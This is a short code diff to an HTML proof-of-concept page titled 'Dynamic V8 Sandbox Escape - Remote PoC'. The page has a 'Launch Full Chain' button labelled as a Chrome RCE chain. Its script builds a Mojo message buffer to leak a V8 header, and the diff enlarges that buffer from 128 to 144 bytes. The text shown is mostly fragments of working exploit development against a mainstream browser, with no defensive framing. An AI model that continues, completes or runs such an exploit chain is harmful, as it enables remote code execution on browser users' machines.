@@ -4,7 +4,7 @@
     <title>Dynamic V8 Sandbox Escape - Remote PoC</title>
 </head>
 <body>
-    <h1>Stable Chrome RCE1 Chain</h1>
+    <h1>Stable Chrome RCE2 Chain</h1>
     <p>Status: <b id="status">Ready</b></p>
     <button id="launch">Launch Full Chain</button>
 
@@ -38,8 +38,8 @@
             // 3. THE HEIST: Request the legit header from the Browser
             status.innerText = "Step 2: Leaking V8 Header via Mojo...";
             
-            // INCREASED to 128 to comfortably fit the 32-byte header + 24-byte Params + 16-byte GURL + 56-byte String
-            const fetchMsg = new ArrayBuffer(128); 
+            // INCREASED to 144 to comfortably fit the 32-byte header + 24-byte Params + 16-byte GURL + 56-byte String
+            const fetchMsg = new ArrayBuffer(144); 
             const fv = new DataView(fetchMsg);
             
             // Mojo Request Header (32 bytes)
